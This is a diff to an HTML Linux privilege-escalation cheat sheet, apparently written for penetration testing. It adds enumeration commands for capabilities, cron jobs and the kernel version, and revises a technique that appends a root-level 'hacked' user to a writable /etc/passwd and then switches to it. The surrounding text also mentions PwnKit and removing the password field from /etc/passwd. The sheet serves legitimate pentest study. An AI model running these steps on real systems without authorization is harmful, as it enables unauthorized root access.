@@ -172,7 +172,9 @@ User daniel.carter may run the following commands on NIX02:
                     <h2 id="Capabilities">Capabilities</h2>
                     <ul>
                         <h3> Check for caps </h3>
-                        <pre><code class="language-bash">getcap -r / 2>/dev/null</code></pre>
+                        <pre><code class="language-bash">getcap -r / 2>/dev/null
+/usr/sbin/getcap -r / 2>/dev/null   #Full path
+                        </code></pre>
                         <p> Sometimes this command will not work so you can use the following which search for getcap in multiple directories</p>
                         <pre><code class="language-bash">find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;</code></pre>
                         <p>There are several linux capabilities that can be used to escalte user's privilege to root</p>
@@ -194,6 +196,8 @@ User daniel.carter may run the following commands on NIX02:
                         <h3> Check for cronjobs </h3>
                         <pre><code class="language-bash">cat /etc/crontab</code></pre>
                         <pre><code class="language-bash">/etc/cron.d/</code></pre>
+                        <pre><code class="language-bash">grep "CRON" /var/log/syslog  #Check this log for deployed CRONS</code></pre>
+                        
                         <h3> Scheduled cronjobs </h3>
                         <pre><code class="language-bash">/etc/cron.hourly/</code></pre>
                         <pre><code class="language-bash">/etc/cron.daily/</code></pre>
@@ -299,7 +303,10 @@ int main(void)
                     <h2 id="Kernel exploits">Kernel exploits</h2>
                     <ul>
                         <p>Based on the information gathered during enumration phase search for kernel exploit using the <b>kernel version</b> or the <b>operating system version</b></p>
-                        <pre><code class="language-bash">uname -a</code></pre>
+                        <pre><code class="language-bash">uname -a
+cat /etc/issue
+arch</code></pre>
+
 
                         <p>Some that have worked in any other ocassions</p>
                         <ul>
@@ -315,9 +322,10 @@ chmod +x ./PwnKit
                     <h2 id="Modifyable /etc/passwd">Modifyable /etc/passwd</h2>
                     <ul>
                         <p>In some cases we may found an /etc/passwd file which can be modifyed in that case we could add a new user with SUID permisions of root </p>
-                        <pre><code class="language-bash">openssl passwd -1 -salt salt 1234</code></pre>
-                        <pre><code class="language-bash">echo "hacked:$1$salt$kqNI5AJoJdN1WgWoNslBD0:0:0:root:/root:/bin/bash" >> /etc/passwd</code></pre>
-                        <pre><code class="language-bash">su hacked 1234</code></pre>
+                        <p style="color: red;"><b>Highly recommended to generate the code from inside the box you are pentesting</b></p>
+                        <pre><code class="language-bash">openssl passwd 1234</code></pre>
+                        <pre><code class="language-bash">echo "hacked:INSERT_YOUR_CODE_HERE:0:0:root:/root:/bin/bash" >> /etc/passwd</code></pre>
+                        <pre><code class="language-bash">su hacked PASSWORD</code></pre>
                         <p>We can always remove the <b>x</b> in the passwd file and login as root without providing the password</p>
                     </ul>
 
